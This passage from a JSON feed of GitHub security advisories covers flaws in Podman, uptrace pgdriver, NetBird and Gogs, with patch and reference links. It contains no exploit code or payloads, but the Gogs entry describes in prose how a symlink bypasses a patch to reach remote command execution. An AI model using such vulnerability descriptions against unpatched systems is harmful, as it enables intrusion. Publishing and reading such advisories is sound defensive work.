            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The podman machine init command fails to verify the TLS certificate when downloading the VM images from an OCI registry (which it does by default since 5.0.0) allowing a possible Man In The Middle attack.</p>\n<h3 id=\"patches\">Patches</h3>\n<p><a href=\"https://github.com/containers/podman/commit/726b506acc8a00d99f1a3a1357ecf619a1f798c3\">https://github.com/containers/podman/commit/726b506acc8a00d99f1a3a1357ecf619a1f798c3</a>\nFixed in v5.5.2</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Download the disk image manually via some other tool that verifies the TLS connection. Then pass the local image as file path (podman machine init --image ./somepath)</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/containers/podman/security/advisories/GHSA-65gg-3w2w-hr4h\">https://github.com/containers/podman/security/advisories/GHSA-65gg-3w2w-hr4h</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-6032\">https://nvd.nist.gov/vuln/detail/CVE-2025-6032</a></li>\n<li><a href=\"https://github.com/containers/podman/commit/726b506acc8a00d99f1a3a1357ecf619a1f798c3\">https://github.com/containers/podman/commit/726b506acc8a00d99f1a3a1357ecf619a1f798c3</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2025-6032\">https://access.redhat.com/security/cve/CVE-2025-6032</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2372501\">https://bugzilla.redhat.com/show_bug.cgi?id=2372501</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-65gg-3w2w-hr4h\">https://github.com/advisories/GHSA-65gg-3w2w-hr4h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-65gg-3w2w-hr4h",
            "title": "[github.com/containers/podman/v4] Podman Improper Certificate Validation; machine missing TLS verification",
            "date_modified": "2025-06-28T00:05:31.000Z",
            "date_published": "2025-06-25T21:57:00.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-65gg-3w2w-hr4h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The podman machine init command fails to verify the TLS certificate when downloading the VM images from an OCI registry (which it does by default since 5.0.0) allowing a possible Man In The Middle attack.</p>\n<h3 id=\"patches\">Patches</h3>\n<p><a href=\"https://github.com/containers/podman/commit/726b506acc8a00d99f1a3a1357ecf619a1f798c3\">https://github.com/containers/podman/commit/726b506acc8a00d99f1a3a1357ecf619a1f798c3</a>\nFixed in v5.5.2</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Download the disk image manually via some other tool that verifies the TLS connection. Then pass the local image as file path (podman machine init --image ./somepath)</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/containers/podman/security/advisories/GHSA-65gg-3w2w-hr4h\">https://github.com/containers/podman/security/advisories/GHSA-65gg-3w2w-hr4h</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-6032\">https://nvd.nist.gov/vuln/detail/CVE-2025-6032</a></li>\n<li><a href=\"https://github.com/containers/podman/commit/726b506acc8a00d99f1a3a1357ecf619a1f798c3\">https://github.com/containers/podman/commit/726b506acc8a00d99f1a3a1357ecf619a1f798c3</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2025-6032\">https://access.redhat.com/security/cve/CVE-2025-6032</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2372501\">https://bugzilla.redhat.com/show_bug.cgi?id=2372501</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-65gg-3w2w-hr4h\">https://github.com/advisories/GHSA-65gg-3w2w-hr4h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-65gg-3w2w-hr4h",
            "title": "[github.com/containers/podman/v5] Podman Improper Certificate Validation; machine missing TLS verification",
            "date_modified": "2025-06-28T00:05:31.000Z",
            "date_published": "2025-06-25T21:57:00.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-65gg-3w2w-hr4h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>uptrace pgdriver v1.2.1 was discovered to contain a SQL injection vulnerability via the appendArg function in /pgdriver/format.go.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-44906\">https://nvd.nist.gov/vuln/detail/CVE-2024-44906</a></li>\n<li><a href=\"https://github.com/uptrace/bun/blob/1573ae7c2fffad1a7f72fd2d205e924b2fd4043b/driver/pgdriver/format.go#L62\">https://github.com/uptrace/bun/blob/1573ae7c2fffad1a7f72fd2d205e924b2fd4043b/driver/pgdriver/format.go#L62</a></li>\n<li><a href=\"https://github.com/uptrace/bun/tree/master/driver/pgdriver\">https://github.com/uptrace/bun/tree/master/driver/pgdriver</a></li>\n<li><a href=\"https://media.defcon.org/DEF%20CON%2032/DEF%20CON%2032%20presentations/DEF%20CON%2032%20-%20Paul%20Gerste%20-%20SQL%20Injection%20Isn%27t%20Dead%20Smuggling%20Queries%20at%20the%20Protocol%20Level.pdf\">https://media.defcon.org/DEF%20CON%2032/DEF%20CON%2032%20presentations/DEF%20CON%2032%20-%20Paul%20Gerste%20-%20SQL%20Injection%20Isn%27t%20Dead%20Smuggling%20Queries%20at%20the%20Protocol%20Level.pdf</a></li>\n<li><a href=\"https://www.sonarsource.com/blog/double-dash-double-trouble-a-subtle-sql-injection-flaw\">https://www.sonarsource.com/blog/double-dash-double-trouble-a-subtle-sql-injection-flaw</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h4h6-vccr-44h2\">https://github.com/advisories/GHSA-h4h6-vccr-44h2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h4h6-vccr-44h2",
            "title": "[github.com/uptrace/bun/driver/pgdriver] uptrace pgdriver SQL injection vulnerability",
            "date_modified": "2025-06-25T19:42:06.000Z",
            "date_published": "2025-06-12T18:31:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h4h6-vccr-44h2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A static initialization vector (IV) in the encrypt function of netbird management's service from v0.23.2 to v0.29.1 allows attackers to obtain sensitive information (email addresses) when in possession of the audit events database.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-41260\">https://nvd.nist.gov/vuln/detail/CVE-2024-41260</a></li>\n<li><a href=\"https://gist.github.com/nyxfqq/92232108ac153e95d538bb17fc5ad636\">https://gist.github.com/nyxfqq/92232108ac153e95d538bb17fc5ad636</a></li>\n<li><a href=\"https://github.com/netbirdio/netbird/issues/2246\">https://github.com/netbirdio/netbird/issues/2246</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9v35-4xcr-w9ph\">https://github.com/advisories/GHSA-9v35-4xcr-w9ph</a></li>\n<li><a href=\"https://github.com/netbirdio/netbird/pull/2569\">https://github.com/netbirdio/netbird/pull/2569</a></li>\n<li><a href=\"https://github.com/netbirdio/netbird/commit/cf6210a6f42355e88c422c624376f6fcdaea6729\">https://github.com/netbirdio/netbird/commit/cf6210a6f42355e88c422c624376f6fcdaea6729</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9v35-4xcr-w9ph",
            "title": "[github.com/netbirdio/netbird] NetBird uses a static initialization vector (IV)",
            "date_modified": "2025-06-25T19:30:54.000Z",
            "date_published": "2024-08-01T18:32:50.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9v35-4xcr-w9ph"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Due to the insufficient patch for the CVE-2024-39931, it's still possible to delete files under the <code>.git</code> directory and achieve remote command execution.</p>\n<h3 id=\"details\">Details</h3>\n<p>In the patch for CVE-2024-39931, the following check is added:\n<a href=\"https://github.com/gogs/gogs/commit/77a4a945ae9a87f77e392e9066b560edb71b5de9\">https://github.com/gogs/gogs/commit/77a4a945ae9a87f77e392e9066b560edb71b5de9</a></p>\n<pre><code class=\"language-diff\">+\t// 🚨 SECURITY: Prevent uploading files into the \".git\" directory\n+\tif isRepositoryGitPath(opts.TreePath) {\n+\t\treturn errors.Errorf(\"bad tree path %q\", opts.TreePath)\n+\t}\n</code></pre>\n<p>While the above code snippet checks if the specified path is a <code>.git</code> directory, there are no checks for symbolic links in the later steps. So, by creating a symbolic link that points to the <code>.git</code> directory, an attacker can still delete arbitrary files in the <code>.git</code> directory and achieve remote command execution.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Unprivileged user accounts can execute arbitrary commands on the Gogs instance with the privileges of the account specified by <code>RUN_USER</code> in the configuration. It allows attackers to access and alter any users' code hosted on the same instance.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/gogs/gogs/security/advisories/GHSA-wj44-9vcg-wjq7\">https://github.com/gogs/gogs/security/advisories/GHSA-wj44-9vcg-wjq7</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56731\">https://nvd.nist.gov/vuln/detail/CVE-2024-56731</a></li>\n<li><a href=\"https://github.com/gogs/gogs/commit/77a4a945ae9a87f77e392e9066b560edb71b5de9\">https://github.com/gogs/gogs/commit/77a4a945ae9a87f77e392e9066b560edb71b5de9</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-ccqv-43vm-4f3w\">https://github.com/advisories/GHSA-ccqv-43vm-4f3w</a></li>\n<li><a href=\"https://github.com/gogs/gogs/releases/tag/v0.13.3\">https://github.com/gogs/gogs/releases/tag/v0.13.3</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wj44-9vcg-wjq7\">https://github.com/advisories/GHSA-wj44-9vcg-wjq7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wj44-9vcg-wjq7",
            "title": "[gogs.io/gogs] Gogs allows deletion of internal files which leads to remote command execution",
            "date_modified": "2025-06-24T19:00:21.000Z",
            "date_published": "2025-06-24T19:00:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wj44-9vcg-wjq7"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}